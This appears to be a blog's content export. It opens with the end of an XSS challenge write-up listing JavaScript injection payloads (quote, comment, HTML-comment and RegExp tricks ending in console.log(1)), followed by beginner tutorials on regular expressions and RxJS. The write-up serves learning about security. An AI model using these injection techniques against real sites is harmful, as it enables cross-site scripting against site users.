and any characters at the end. How can we come up with executable JS code? One of the most intuitive ideas I have is to add a single quote in front, so that it becomes a string, and then add something at the end to execute it, like this: ')]&#125;';console.log(1) ')]&#125;',console.log(1) ')]&#125;'+console.log(1) Remember to strictly follow the rules mentioned earlier. In addition, adding a newline to a single-line comment or using multi-line comments is also an intuitive idea: //)]&#125;' console.log(1) /*)]&#125;'*/console.log(1) And from the article, we know that there are some comment styles in JS that you may not know: &lt;!--)]&#125;' console.log(1) -->)]&#125;' console.log(1) The related V8 test file is here: v8&#x2F;test&#x2F;mjsunit&#x2F;html-comments.js In addition to the above, you can also use RegExp! /()]&#125;'/+console.log(1) /[)]&#125;'/+console.log(1) ConclusionNot only JS, but HTML is also vast and profound, with various magical features. I thought this challenge was easy to pass, but it was just using the solution I already knew to pass. Learning from other people’s answers seems to be more important than passing the challenge. In this challenge, I learned: The behavior of the &lt;select&gt; and &lt;table&gt; tags Using &lt;!-- and --&gt; as comments Using RegExp to construct valid code.","link":"/2021/11/14/en/intigriti-xss-1021/"},{"title":"A Simple Guide to Regular Expressions","text":"IntroductionRecently, I came across a great tutorial on Regular Expressions for Regular Folk, which is well-written and beautifully designed. Since Regular Expressions are commonly used in development, but not covered in my course, I decided to write a simple article on this topic. This article is intended for beginners who have no idea what Regular Expressions are. Therefore, the explanations will be relatively simple, and the examples will be relatively easy to understand. The patterns will also be relatively fixed, with fewer boundary conditions to consider, making it easier to learn. Alright, let’s get started! What are Regular Expressions?To discuss this topic, I think examples are the best way to explain. Therefore, I will provide several related examples to help you understand what Regular Expressions are used for. Example 1: Finding DataSuppose you want to find data in an Excel spreadsheet that contains only names, and you want to find all the people with the surname “Li”. You might open the search interface and enter “Li”. However, this method is not very effective because it will find not only people with the surname Li, but also anyone with the character “Li” in their name. Therefore, the data found needs to be manually filtered again. What should you do? Some search interfaces may have some options for you to choose from, such as “match at the beginning”. If so, then there is no problem, and you can easily find people with the surname Li. But what if it’s a more complex example? For example, you want to find “Li X Ming”, and all the names that match this rule. Many systems may not be able to do this because this feature is not provided. Even if it is available, the rules may be different. For example, Company A’s system may require inputting: Li% Ming, while Company B’s system may require inputting: Li* Ming. Is there a “universal rule” that allows us to easily convert these requirements into symbols and text? Example 2: Data ValidationCurrently, most mobile phone numbers in Taiwan follow a certain format, which is a total of ten digits, with the first two digits being 09, such as 0912-345-678 or 0900-111-222. If we have a string and want to verify that it meets the format of a Taiwanese mobile phone number, we can use the following three rules: There are a total of 10 digits. The beginning must be 09. Each character must be a number. As long as these three rules are met, it can be said that it meets the format (but the number may not actually exist). How should we write the code for this? Perhaps we can write it like this: function isTaiwanMobilePhone(phone) &#123; if (phone.length !== 10) return false if (phone.indexOf('09') !== 0) return false for(let digit of phone) &#123; if (!Number.isInteger(Number(digit))) &#123; return false &#125; &#125; return true &#125; Actually, it’s just converting the above text into code. However, there are many, many format-related validations, such as: Validating home phone numbers Validating email addresses Validating URLs The essence of these is actually the same, which is a certain format, but currently, we can only use text to represent these formats and rules. Is there a way to convert these requirements into symbols and text easily? If so, it would be much more convenient. Example 3: Extracting DataSuppose I have a lot of emails, each email is one line, in the following format: aaa@gmail.com ccc@gmail.com ddd@yahoo.com.tw eee@msn.com fff@ptt.com But I don’t care what the account is, I care which company’s mailbox it is, so I want to extract the domains of these emails, and further remove the “.com” or other endings, so that my data becomes like this: gmail gmail yahoo msn ptt How can we do this with code? Because the processing to be done for each line is exactly the same, we only need to demonstrate the processing of one piece of data. If we want to change it to multiple pieces, we just use a loop to run it, and feed each piece of data into it: let email = 'aaa@gmail.com' let temp = email.split('@') // 先用 @ 來分割 let domain = temp[1] // 去掉帳號，只拿後面的 domain let temp2 = domain.split('.') // 把 domain 用點切割 console.log(temp2[0]) // 拿第一個，就會是 gmail (Note: The real requirements and domains may be more complex. Here, we just demonstrate the concept simply.) Excluding the data without the first line and the output of the last line, we used three steps in total, combined with string-related methods to process this requirement. If we express the above requirement in plain language, it is actually: “I only need the text from @ to the first . after it.” Is it possible to write this rule in a certain form, so that we can quickly express this requirement? Well, there’s no need to keep you in suspense anymore. I believe you all know the answer. Yes, all three problems have solutions, and the answer is the same: our topic, Regular Expressions, which is also known as “正規表達式” in Chinese, and sometimes abbreviated as regex or regexp, etc., all referring to the same thing. Upon careful consideration, we will find that the essence of these problems is actually the same, which is to find “strings that meet certain specific rules”. The first example is looking for “Li X Ming”.The second example is looking for “09xxxxxxxx”.The third example is looking for “&#x78;&#x78;&#x78;&#64;&#x6f;&#x6f;&#111;&#46;&#x78;&#x78;&#x78;“, and only wants the ooo part. Regular Expression (RE) is just a set of rules expressed in a specific format using symbols. The reason for learning this is that it is the most widely used and supported by almost every programming language, and some editors or web pages even have it! Exploring Regular ExpressionAs mentioned earlier, RE is actually a set of symbols used to represent the rules you want to match. Generally, when writing RE, you will use // to wrap the rules you want to express. The simplest rule is to directly put the word you want to match in it, for example: /xyz/, which is to determine whether a string contains the continuous three words “xyz”: The screenshot of this website is called RegEx101, where you can provide your RE and the string you want to match, and it will automatically help you match and display relevant information. The blue part in the above picture is the part that matches. So you can use /xyz/ to find out if a string contains xyz, and you can also know where xyz appears. However, this function cannot meet our needs, so let’s take a look at a powerful symbol: []. You can put a lot of things in the brackets, as long as one character matches, it is a match. For example: /[aeiou]/ is to match whether a string contains any vowels: Since you can put a lot of words, you can also put them like this: /[0123456789]/, and you can match numbers! What about letters? Do you have to use /[abcdefghijklmnopqrstuvwxyz]/? This is too long. For this kind of “continuous” thing, you can use - to represent it. For example: /[0-9]/ and /[a-z]/ are numbers and lowercase letters respectively: If it is uppercase letters, you can use /[A-Z]/, and these rules can be used in combination. For example: /[0-9a-z]/ can match “numbers or lowercase letters”, and /0-9a-zA-Z/ is the commonly used “numbers or English letters”. However, it should be emphasized here again that [] only matches “one word”, so as long as one character matches, it meets this rule. Next, if you have to enter so many words every time you match numbers or letters, it is obviously a waste of time. Therefore, for these commonly used rules, there are more convenient methods. These rules usually start with \\, for example, \\d actually means /[0-9]/ (d is digit), and \\d represents a number, so if I type: /\\d\\d\\d/, it is to match three numbers: There is also another commonly used one, which is \\w (w should mean word), which matches numbers, English uppercase and lowercase letters, and underscores. In other words, / \\w / is equivalent to /[a-zA-Z0-9_]/. Finally, there is a magical symbol, which is a dot: /. /, which means “any character” and can match any word. Based on the above, you can think about which strings can match this RE: / \\w\\w\\w. \\d\\d\\d /. 000000 9999999 aaaaaaa 0a0a000 0a0a0a0 cc3c777 cccc777 Answer: By this point, if you want to match something with a “fixed length” and a simpler pattern, you should not be difficult, because you can use [], ., \\d, and \\w to match the desired pattern. For example, the mobile phone number mentioned earlier: There are a total of 10 digits The beginning must be 09 Each character must be a number Isn’t it /09\\d\\d\\d\\d\\d\\d\\d\\d/? Huh…no, why is 09112223334, which has 11 digits, also matched? This is because the regular expression matches only “part” of the string. As long as a part of the entire string matches, it will be matched. So if you want to use the above regular expression to check if a string is a mobile phone number, it won’t work, you still need two things. The first is called: ^, which means the beginning of the string; the second is called: $, which means the end of the string. Simply put, /xyz/ will match any string that “contains the three words xyz”, such as AxyzB or xyzAB. Then /^xyz/ is any string that “starts with xyz”, such as xyzAB or xyz. So if you want to match a mobile phone number, you can add these two symbols, /^09\\d\\d\\d\\d\\d\\d\\d\\d$/, and you’re done. Practical Use of Regular ExpressionAlthough we have indeed written the RE for phone numbers correctly, don’t you find it strange? Usually, when we write programs, anything that is repeated can be simplified by loops or functions. Regular expressions should also have “repeating” symbols, right? Yes, you can add &#123;&#125; after what you want to repeat, for example, /^09\\d&#123;8&#125;$/ means that \\d will be repeated eight times, so you don’t have to write so much. There are several different ways to repeat times. For example, the &#123;8&#125; used just now means that there must be 8, while &#123;8,10&#125; means that 8 to 10 are all possible, and &#123;8,&#125; means “8 or more”. After talking so much, it’s just talk on paper. Let’s experiment immediately. Here we use JS for demonstration: var re = /^09\\d&#123;8&#125;$/ console.log(re.test(\"0911222333\")) // true console.log(re.test(\"1911222333\")) // false console.log(re.test(\"09112223332\")) // false console.log(re.test(\"091222333\")) // false In JS, as long as you wrap the RE with // according to the format we mentioned earlier, it will automatically become a RegExp object, and you can use its test method to compare with the string. If you don’t like to use //, using new RegExp is also possible, but you need to pay special attention to changing \\d to \\\\d in the string, otherwise it will be treated as an escape character: var re = new RegExp('^09\\d&#123;8&#125;$') // => /^09d&#123;8&#125;$/ var re = new RegExp('^09\\\\d&#123;8&#125;$') // => /^09\\d&#123;8&#125;$/ So, if you want to verify whether a string conforms to RE, use the test method. What if you want to find a match? For example, the example we mentioned earlier: 李X明, written as RE will become: /李.明/. If you want to find the matched words, the method is different. When testing just now, we used RE.test(string). To match, you need to reverse it and become: string.match(RE), which means using RE to compare with the string, and the subject is different. var re = /李.明/ var str = '李曉明王阿明王小明李大明太大明阿明無名小站' console.log(str.match(re)) /* 輸出： 0: \"李曉明\" groups: undefined index: 0 input: \"李曉明王阿明王小明李大明太大明阿明無名小站\" */ If there is a match, the return value will be an array, otherwise it will be null. But with this method, I can only match one. What if I want to match all of them? You can use matchAll: var re = /李.明/ var str = '李曉明王阿明王小明李大明太大明阿明無名小站' console.log(str.matchAll(re)) /* 輸出：Uncaught TypeError: String.prototype.matchAll called with a non-global RegExp argument */ An error message non-global RegExp argument appeared. What does this mean? In addition to the matching symbols, regular expressions also have some flags (or you can simply think of them as parameters) that can be set. For example, /xyz/ will only match lowercase xyz, but if you add an i (I guess it means ignore case), it becomes /xyz/i, which will ignore case. The one added after / is the flag. If you want to add multiple flags, just continue to add them. The g flag means global, which means “I want them all” and will match multiple strings. Therefore, the above example needs to add g, becoming: var re = /李.明/g var str = '李曉明王阿明王小明李大明太大明阿明無名小站' var result = str.matchAll(re) console.log(result) // RegExpStringIterator console.log(...result) After using matchAll, it will return an Iterator, and you can use for...of to extract the values, or use [...result] to convert it to an array, and you can see all the results. In this way, two of the three problems mentioned earlier have been solved, and only the last one is left: matching “&#120;&#x78;&#120;&#64;&#x6f;&#111;&#x6f;&#46;&#x78;&#x78;&#x78;“ and only wanting the ooo part. There are two difficulties in this pattern: ooo is an indefinite number of words You want to take a part, not the entire pattern We have already mentioned that &#123;8&#125; can be used to specify the number of times. What if the number of times is not fixed? There is also a symbol to help us do this, which is +, which means “one or more”, so /^A\\d+Z$/ will match any string that starts with A, ends with Z, and has one or more numbers in between: Then there is a group of magical symbols called (), which is the most common parentheses, and the technical term is Capturing Groups. What is it used for? It means to extract the pattern that matches inside here. For example, we can change the /^A\\d+Z$/ just now, add parentheses in the middle of the number, and become: /^A(\\d+)Z$/. At first glance, there is not much difference, but we can use match to test it: var re = /^A(\\d+)Z$/ console.log('A12345Z'.match(re)) /* 0: \"A12345Z\" 1: \"12345\" groups: undefined index: 0 input: \"A12345Z\" length: 2 */ Originally, when matching, there would only be one set of data in the array, but now there is one more set, and that set is the part we framed with (), which means: “I want to know what is matched inside here.” With the two great tools + and (), we can try to solve the problem mentioned earlier: We can first match the beginning of the string: /^/Then add the account and @ in front: /^.+@/Then match the domain behind and remember it: /^.+@(.+)/Finally, end with a period, remember to escape the front with \\: /^.+@(.+)\\./ The green part in the following figure is what we have marked with (): Except for yahoo.com.tw, all the others have succeeded! Why did yahoo.com.tw fail? Because you will find that according to our rules, the following two states actually meet: The part memorized before (.+) matches yahoo.com, and the . after it matches the dot at the beginning of .tw. The part memorized before (.+) matches yahoo, and the . after it matches the dot at the beginning of .com. The first case is that the (.+) part should match as much as possible, while the second case is the opposite, and the less matching, the better. And for the RE we wrote, it actually belongs to the first case, that is, the more matching, the better, so it becomes yahoo.com instead of the yahoo we expected. So, if you want to become the second case: the less matching, the better, what should you do? It’s simple, just add a ? after the +: If written in code, it will look like this: var emails = [ 'aaa@gmail.com', 'ccc@gmail.com', 'ddd@yahoo.com.tw', 'eee@msn.com', 'fff@ptt.com' ] var re = /^.+@(.+?)\\./ for(let email of emails) &#123; var result = email.match(re) console.log(result[1]) &#125; /* gmail gmail yahoo msn ptt */ By this point, we have perfectly solved the three situations mentioned at the beginning using Regular Expression! SummaryThe main purpose of this article is to simply talk about Regular Expression, so the examples brought are relatively simple, and not much is mentioned. Here, I will briefly mention some basic things that I did not mention, such as originally \\d matches numbers. If you change d to uppercase, it becomes the opposite, so \\D means: not a number, and \\W is the same, meaning: not “English uppercase and lowercase letters, numbers, and underscores”. Next is the + mentioned earlier, which means one or more. If you want zero or more, you can use *, and then there is a special word \\s that can match any whitespace (whitespace, tab, and line break). If you want to write regular expressions to be super complex, it can become very complicated, and there are many rules, but generally, the basics should be enough. Finally, I recommend the tutorial at the beginning again: Regular Expressions for Regular Folk, the webpage is beautiful, and the examples provided are very practical. I highly recommend everyone to refer to it.","link":"/2020/05/16/en/introduction-to-regular-expression/"},{"title":"The Most Beginner-Friendly RxJS Tutorial","text":"IntroductionI have been interested in RxJS for quite some time. I first learned about it through redux-observable, a middleware for Redux that Netflix uses to solve complex asynchronous problems. At that time, I hadn’t even figured out redux-saga, and I didn’t expect another new thing to come out. Half a year ago, I spent some time searching for information on the internet, trying to understand the whole thing. However, for me, many of the tutorials were either too fast-paced or too detailed, making it difficult for beginners to follow. This time, I had the opportunity to try to introduce redux-observable into a new project at work. As someone who advocates for its adoption, I must have a certain understanding of this thing. With this idea in mind, I spent some time last week studying the relevant resources again and gradually came up with a method of “I think I can explain RxJS more clearly” and share it with you here. Before we begin, I want to give a big shoutout to last year’s iT 邦幫忙鐵人賽 Web group champion: 30 Days to Master RxJS. This series of articles is very comprehensive, and you can feel that the author has put a lot of effort into it. If you are interested in more applications after reading this article, you can read the entire series of articles. Okay, let’s get started! Forget About RxJS for NowYes, you read that right. The first thing you need to learn about RxJS is to forget about it completely. Forget that it exists, completely forget about it. Let me talk about a few other things first, and I’ll remind you when we need to talk about RxJS. Before we talk about the protagonist, let’s do something interesting! Programming Basic Ability TestLet’s start with a simple warm-up exercise. The question is: There is an array with three types of data: numbers, strings composed of a~z, and strings composed of numbers. Please multiply each number and string composed of numbers by two and add them up.Example input: [1, 5, 9, 3, ‘hi’, ‘tb’, 456, ‘11’, ‘yoyoyo’] After reading the question, you should say, “What’s so difficult about this?” and write the following code within a minute: const source = [1, 5, 9, 3, 'hi', 'tb', 456, '11', 'yoyoyo']; let total = 0; for (let i = 0; i &lt; source.length; i++) &#123; let num = parseInt(source[i], 10); if (!isNaN(num)) &#123; total += num * 2; &#125; &#125; I believe everyone can write the above code very intuitively, but if you are a fan of functional programming, you may use another way of thinking to solve the problem: const source = [1, 5, 9, 3, 'hi', 'tb', 456, '11', 'yoyoyo']; let total = source .map(x => parseInt(x, 10)) .filter(x => !isNaN(x)) .map(x => x * 2) .reduce((total, value) => total + value ) The first example is called Imperative, and the second example, which uses an array with a bunch of functions, is called Declarative. If you look up the definitions, you should see the following explanations: Imperative commands the machine to do things (how), so no matter what you want (what), it will be implemented according to your command; Declarative tells the machine what you want (what) and lets the machine figure out how to do it (how). Okay, did you understand what the above is talking about? I didn’t. So let’s look at another example. In fact, you have been using Declarative all the time, but you just didn’t know it. That is SQL: SELECT * from dogs INNER JOIN owners WHERE dogs.owner_id = owners.id This sentence means: I want all the data of the dogs plus the data of the owners. I only said “I want,” so how do I get this data? I don’t know, and I don’t need to know. Just let the underlying SQL decide how to operate. If I want to do this data myself, in JavaScript, I have to write it like this (code taken from Comparison of Declarative Programming and Imperative Programming): //dogs = [&#123;name: 'Fido', owner_id: 1&#125;, &#123;...&#125;, ... ] //owners = [&#123;id: 1, name: 'Bob'&#125;, &#123;...&#125;, ...] var dogsWithOwners = [] var dog, owner for(var di=0; di &lt; dogs.length; di++) &#123; dog = dogs[di] for(var oi=0; oi &lt; owners.length; oi++) &#123; owner = owners[oi] if (owner &amp;&amp; dog.owner_id == owner.id) &#123; dogsWithOwners.push(&#123; dog: dog, owner: owner &#125;) &#125; &#125; &#125; You should be able to roughly experience the difference between the two. The latter requires you to decide step by step what to do, while the former just tells you: “I want this kind of data.” Next, let’s focus back on the exercise of multiplying numbers by two and adding them. For me, the biggest difference is that the latter example using an array with a function, and its core concept is: Transform the original data into the information you want. This is super important because in the initial example, we parsed, checked, and added the numbers ourselves step by step to get the total sum. In contrast, the latter example transformed the original data (array) through a series of transformations (map, filter, reduce) to get the answer we wanted. If we draw it as a picture, it should look like this (please forgive me for being lazy and leaving out the part where we multiply by two, but the meaning is not affected): Transforming the original data through a series of transformations to get the answer you want is the biggest difference in the latter. Once you have this basic knowledge, RxJS won’t seem too strange. Reactive ProgrammingWhen it comes to RxJS, we always talk about the term Reactive. So what is Reactive? From the literal meaning of the English word, it means “reaction, reactive”, which means you need to react to something. So Reactive is actually saying: “When something happens, I can react to it.” Let’s take a well-known example: window.addEventListener('click', function()&#123; console.log('click!'); &#125;) We added an event listener to the window, so we can listen to this event and print out a log every time the user clicks. In other words, this is: “When the window is clicked, I can react to it.” Entering RxJSIf you go to the ReactiveX website, you will find that it has a clear definition of ReactiveX: ReactiveX is a combination of the best ideas fromthe Observer pattern, the Iterator pattern, and functional programming. The first Observer pattern is like an event listener, where we can react to something when it happens; the second Iterator pattern we skip for now, as I think it doesn’t affect understanding for the time being; the third is like the initial example, where we can transform an array multiple times to get the data we want. In Reactive Programming, the two most important things are called Observable and Observer. Actually, the most confusing thing for me at first was that my English was not good, and I didn’t know who was observing and who was being observed. Translate them into Chinese, Observable is “可被观察的” (observable), and Observer is the so-called “观察者” (observer). What does this mean? Just like the example above, when something observable happens, the observer can react to it. Let me give you an example directly: Rx.Observable.fromEvent(window, 'click') .subscribe(e => &#123; console.log('click~'); &#125;) The above code is exactly the same as what we did when we added an event listener to window, except that here we use the method provided by RxJS called fromEvent to convert an event into an Observable, and finally add subscribe. Writing like this means that I have subscribed to this Observable, and whenever anything happens, the function I passed in will be executed. So what exactly is an Observable? An Observable is an observable object that can be anything (for example, the click event of the window in the above example). When there is new data (such as a new click event), you can receive the information of this new data and react to it. Compared with the cold term Observable, I prefer another term, stream. In fact, each Observable is a data stream, but what is a data stream? Just imagine an array that will continue to add elements. When a new event occurs, it is pushed in. If you like a more professional term, you can call it a “series of data events on a time sequence” (taken from Reactive Programming Introduction and Tutorial (Using RxJS)). Or I’ll give another example. Another interpretation of stream is the so-called “streaming video”, which means that as you continue to play, new segments will be downloaded continuously. At this time, you should have a picture in your mind, like a flowing stream, constantly flowing new things, and this thing is called a stream. I understand the data stream, what’s next?As mentioned above, we can convert anything into an Observable and turn it into a data stream, but isn’t this the same as addEventListener? What’s special? Yes, it is really special. I hope you haven’t forgotten the little exercise we just did, which is to transform an array into the data we want through a series of transformations. I just said that you can think of Observable as an “array that will continue to add elements”. What does this mean? It means that we can also make a series of transformations on Observable! We can also use those functions used on arrays! Rx.Observable.fromEvent(window, 'click') .map(e => e.target) .subscribe(value => &#123; console.log('click: ', value) &#125;) We convert the click event into the element clicked through map, so when we finally subscribe, the value received will be what we clicked on. Next, let’s look at a slightly more advanced example: Rx.Observable.fromEvent(window, 'click') .map(e => 1) .scan((total, now) => total + now) .subscribe(value => &#123; document.querySelector('#counter').innerText = value; &#125;) First, we convert each click event into 1 through map (or you can also write it as .mapTo(1)), so a number 1 is sent out every time you click. scan is actually the reduce we used on the array at the beginning, you can think of it as just changing the name. After adding up through scan, it is passed to the subscriber and displayed on the page. With just a few simple lines, a counter that calculates the number of clicks is completed. You can use a simple gif to represent the above example: But Observable is not just that. Next, we will enter its most powerful place. Powerful Combination TechniquesWhat happens when you merge two arrays? For example, [1, 2, 3] and [4, 5, 6]? It depends on what you mean by “merge”. If you mean concatenation, then it’s [1, 2, 3, 4, 5, 6]. If you mean addition, then it’s [5, 7, 9]. So what happens when you merge two Observables? The difference between Observables and arrays is that Observables have an additional dimension: time. Observables are “a series of data events over time”, as I mentioned earlier, and can be thought of as an array that constantly receives new data. Let’s take a look at a great image that clearly explains what happens when two Observables are merged: (Taken from: http://rxmarbles.com/#merge) The top image represents an Observable, with each circle representing a piece of data. The bottom image is the same. When these two are merged, they become the bottom image, which should be fairly easy to understand, like merging two timelines. Let’s take a look at an example that demonstrates the power of merging. We have two buttons, +1 and -1, and a text display showing the current number: How do we achieve this functionality? The basic idea is to first map each +1 click event to the number 1 using mapTo, and call it Observable_plus1. Then create an Observable_minus1 that maps each -1 click event to the number -1. After merging these two Observables, we can use scan to add them up, which gives us the number we should display! Rx.Observable.fromEvent(document.querySelector('input[name=plus]'), 'click') .mapTo(1) .merge( Rx.Observable.fromEvent(document.querySelector('input[name=minus]'), 'click') .mapTo(-1) ) .scan((total, now) => total + now) .subscribe(value => &#123; document.querySelector('#counter').innerText = value; &#125;) If you still don’t understand, you can refer to the beautiful example below, which demonstrates how these two Observables are merged (O represents a click event, and +1 and -1 are the results after mapTo): Let’s compare what the code would look like if we didn’t use Observables: var total = 0; document.querySelector('input[name=plus]').addEventListener('click', () => &#123; total++; document.querySelector('#counter').innerText = total; &#125;) document.querySelector('input[name=minus]').addEventListener('click', () => &#123; total--; document.querySelector('#counter').innerText = total; &#125;) Do you notice the huge difference between the two? As I mentioned earlier, they are two completely different ways of thinking, so the difficulty of Reactive Programming is not in understanding or syntax (you should have some concept of both by now), but in switching to a completely new way of thinking. In the above example, we tell the computer: “When you press the plus button, add one to a variable and change the text; when you press the minus button, subtract one and also change the text”, and we can achieve the functionality of the counter. In the Reactive way, we treat pressing the plus button as a data stream, treat pressing the minus button as another data stream, and then transform and merge these two streams using various functions, so that the final stream is the result we want (the counter). You should now be able to understand what I said at the beginning: “Transforming the original data through a series of conversions to get the answer you want” is the biggest feature of Reactive Programming. Combination of combinationsLet’s take a more complex example, which is to implement a very simple drawing function on canvas, which is to draw when the mouse is pressed and stop when it is released. To implement this function is very simple. Canvas provides the lineTo(x, y) method. As long as you continuously call this method when the mouse moves, you can continuously draw graphics. But one thing to note is that when you press the mouse, you should first call moveTo(x, y) to move the drawing point to the specified position. Why? Assuming that we first draw a picture in the upper left corner and the second time we press the mouse is in the lower right corner, if we do not move first with moveTo but directly use lineTo, an extra line will be drawn from the upper left corner to the lower right corner. The difference between moveTo and lineTo is that the former only moves, and the latter connects with the last point to form a line. var canvas = document.getElementById('canvas'); var ctx = canvas.getContext('2d'); ctx.beginPath(); // Start drawing function draw(e)&#123; ctx.lineTo(e.clientX,e.clientY); // Move to the position of the mouse ctx.stroke(); // Draw &#125; // Only detect mousemove events after pressing the mouse canvas.addEventListener('mousedown', function(e)&#123; ctx.moveTo(e.clientX, e.clientY); // Each time you press, you must first move the drawing point there, otherwise it will be affected by the last drawn position canvas.addEventListener('mousemove', draw); &#125;) // Stop detecting when you release the mouse canvas.addEventListener('mouseup', function(e)&#123; canvas.removeEventListener('mousemove', draw); &#125;) So how to implement this function in RxJS? First of all, intuitively, you should add the mousedown event, right! At least there is a beginning. Rx.Observable.fromEvent(canvas, 'mousedown') .subscribe(e => &#123; console.log('mousedown'); &#125;) But what should happen after the mouse is pressed? At this time, you should start listening to mousemove, so we write it like this, using mapTo to convert each mousedown event into a mousemove Observable: Rx.Observable.fromEvent(canvas, 'mousedown') .mapTo( Rx.Observable.fromEvent(canvas, 'mousemove') ) .subscribe(value => &#123; console.log('value: ', value); &#125;) Then you look at the console, you will find that every time I click, the console will print FromEventObservable &#123;_isScalar: false, sourceObj: canvas#canvas, eventName: &quot;mousemove&quot;, selector: undefined, options: undefined&#125; If you think about it carefully, you will find that it is quite reasonable, because I use mapTo to convert each mouse click event into a mousemove Observable, so what you get after subscribing is this Observable. If drawn as a graph, it looks like this: Alright, so what should we do? What I actually want is not Observable itself, but the things inside this Observable! Currently, the situation is that there is an Observable inside another Observable, with two layers. However, I just want it to be one layer. What should I do? Here’s a trick to simplify Observable: Whenever you have a problem, just think of Array! As I mentioned earlier, Observable can be seen as an advanced version of an array with a time dimension. Therefore, any method that an array has, Observable usually has it too. For example, an array may look like this: [1, [2, 2.5], 3, [4, 5]], with two layers, and the second layer is also an array. If you want to make it one layer, what should you do? Flatten it! If you’ve used lodash or other similar libraries, you should have heard of the method _.flatten, which can flatten this kind of array into [1, 2, 2.5, 3, 4, 5]. If you search for the keyword “flat” in the Rx documentation, you will find a method called FlatMap, which basically maps first and then automatically flattens it for you. Therefore, we can change the code to this: Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove')) .subscribe(e => &#123; console.log(e); &#125;) When you click, you will find that a lot of logs will be printed out as you move the mouse, which means we succeeded. If we draw a diagram, it will look like this (for convenience, I have changed flatMap to map and flatten into two steps in the picture): What’s next? Next, we want to stop it when the mouse is released. How do we do that? RxJS has a method called takeUntil, which means taking until… happens, and the parameter passed in must be an Observable. For example, if you write .takeUntil(window, &#39;click&#39;), it means that if any click event of window occurs, this Observable will immediately terminate and will not send any more data. Applied to the drawing example, we just need to change the parameter passed to takeUntil to mouse release! Let’s also complete the subscribe and drawing function together! Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove')) .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) .subscribe(e => &#123; draw(e); &#125;) After changing it, let’s experiment immediately! After clicking the mouse, the drawing starts smoothly, and it stops when the mouse is released. Perfect! Huh, but why doesn’t it respond when I click the second time? We have created an Observable that can only successfully draw one picture. Why? Let’s take a look at the diagram of takeUntil (taken from: http://rxmarbles.com/#takeUntil) In our case, as long as the mouseup event occurs, the “entire Observable” will stop, so only the first time can draw successfully. But what we want is not like this. What we want is only to stop when mousemove stops, not the entire thing. Therefore, we should put takeUntil after mousemove, that is: Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove') .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) ) .subscribe(e => &#123; draw(e); &#125;) If you follow the rules below, the mousemove Observable inside will stop sending events when the mouse is released, and our outermost Observable listens for mouse clicks and continues to listen. At this point, it’s almost done, but there’s a small bug to fix. We didn’t use moveTo to move when mousedown occurred, causing the problem of connecting what was drawn last time with what was drawn this time. What to do? There is a method called do, which is designed for this situation. It is used when you want to do something but don’t want to affect the data flow. It’s like being able to subscribe to different stages, subscribing once when mousedown occurs and subscribing again when you want to draw. Rx.Observable.fromEvent(canvas, 'mousedown') .do(e => &#123; ctx.moveTo(e.clientX, e.clientY) &#125;) .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove') .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) ) .subscribe(e => &#123; draw(e); &#125;) At this point, we have successfully completed the drawing function. If you want to try to see if you understand, you can try implementing the function of dragging and moving objects, which is similar to detecting mouse events and reacting. Take a break and get ready for the second halfThe goal of the first half is to help you understand what Rx is and master a few basic concepts: A data stream can be transformed into another data stream through a series of transformations. These transformations are basically similar to those of arrays, such as map, filter, flatten, etc. You can merge multiple Observables, and you can flatten two-dimensional Observables. The focus of the second half is on practical applications, focusing on one of the most suitable scenarios for RxJS: APIs. Earlier, we mentioned that DOM object events can be turned into data streams, but in addition to this, Promise can also be turned into data streams. The concept is actually very simple. When the Promise is resolved, a data is sent, and when it is rejected, it is terminated. Let’s take a look at a simple example. Every time you click a button, a request is sent. function sendRequest () &#123; return fetch('https://jsonplaceholder.typicode.com/posts/1').then(res => res.json()) &#125; Rx.Observable.fromEvent(document.querySelector('input[name=send]'), 'click') .flatMap(e => Rx.Observable.fromPromise(sendRequest())) .subscribe(value => &#123; console.log(value) &#125;) The reason for using flatMap here is the same as the drawing example just now. We need to convert the original data stream into a new data stream when the button is pressed. If only map is used, it will become a two-dimensional Observable, so it must be flattened with flatten. You can try changing flatMap to map. The value you finally subscribe to will be a bunch of Observables instead of the data you want. After knowing how to use Rx to handle APIs, you can do a classic example: AutoComplete. When I was doing this example, I referred to a large part of 30 Days of RxJS (19): Practical Example - Simple Auto Complete Implementation, Reactive Programming Introduction and Tutorial (Using RxJS as an Example), and Building Streaming Applications - RxJS Detailed Explanation. Thanks again to these three articles. In order to let everyone understand the difference between Reactive Programming and the traditional way, let’s first use the old method to implement this Auto Complete feature! Let’s start by writing the two bottom-level functions that are responsible for fetching data and rendering the suggestion list. We will use the Wikipedia API as an example: function searchWikipedia (term) &#123; return $.ajax(&#123; url: 'http://en.wikipedia.org/w/api.php', dataType: 'jsonp', data: &#123; action: 'opensearch', format: 'json', search: term &#125; &#125;).promise(); &#125; function renderList (list) &#123; $('.auto-complete__list').empty(); $('.auto-complete__list').append(list.map(item => '&lt;li>' + item + '&lt;/li>')) &#125; One thing to note here is that the data returned by Wikipedia will be an array in the following format: [Your input keyword, List of keywords, Introduction of each keyword, Link of each keyword] &#x2F;&#x2F; Example: [ &quot;dd&quot;, [&quot;Dd&quot;, &quot;DDR3 SDRAM&quot;, &quot;DD tank&quot;], [&quot;&quot;, &quot;Double data rate type three SDRAM (DDR3 SDRAM)&quot;, &quot;DD or Duplex Drive tanks&quot;], [https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Dd&quot;, &quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;DDR3_SDRAM&quot;, &quot;...omitted&quot;] ] In our simple demo, we only need to take the keyword list with index 1. The renderList function takes an array and converts the contents of the array into li to display. With these two basic functions, we can easily complete the Auto Complete feature: document.querySelector('.auto-complete input').addEventListener('input', (e) => &#123; searchWikipedia(e.target.value).then((data) => &#123; renderList(data[1]) &#125;) &#125;) The code should be easy to understand. Every time you enter something, call the API and feed the returned data to renderList for rendering. The basic functionality is completed. Let’s do some optimization, because this implementation actually has some problems. The first problem is that now every time you type a letter, a request will be sent, but this is actually a bit wasteful, because the user may quickly enter: java to find related information, he doesn’t care about j, ja, jav these three requests. How to do it? We just rewrite it to send a request only if there is no new input within 250ms, which can avoid this kind of waste. This technique is called debounce, and it is also very simple to implement, using 